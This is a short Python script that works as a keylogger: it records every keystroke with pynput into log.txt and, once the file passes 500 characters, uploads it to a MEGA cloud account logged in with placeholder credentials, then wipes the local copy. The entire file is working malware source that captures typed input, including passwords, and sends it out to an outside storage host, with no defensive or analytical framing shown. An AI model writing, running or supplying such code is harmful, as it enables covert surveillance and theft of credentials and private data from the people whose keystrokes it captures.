from mega import Mega
from pynput.keyboard import Listener

mega = Mega()
m = mega.login('xxxxx@relay.firefox.com','xxxxpasswordxxxx')  # login into mega account using  username and password where log.txt file is uploaded

def on_press(key):  # This function takes the keystroke logs and saves the file to log.txt
    with open('log.txt','a') as f:
        f.write(str(key)+'\n')   # writes the keystroke from the user inputs an every newline
        file1 = open("log.txt", "r") # reads the content of the file log.txt
        str1 = file1.read() 
        char_count = len(str1)# This part takes counts the number of characters in the file 
        print('The Number of characters in text file :', char_count)
        if char_count>500: # once the character count reaches 500 ; file is uploaded to mega repo
            print('uploading')
            file = m.upload('log.txt')  # uploads the log.txt to mega repo
            file1 = open("log.txt", "w") # once uploaded, over write the existing contents in local ,log.txt file

with Listener(on_press=on_press) as listener: # keeps on listening the user's keystrokes and calls on_press()
    listener.join()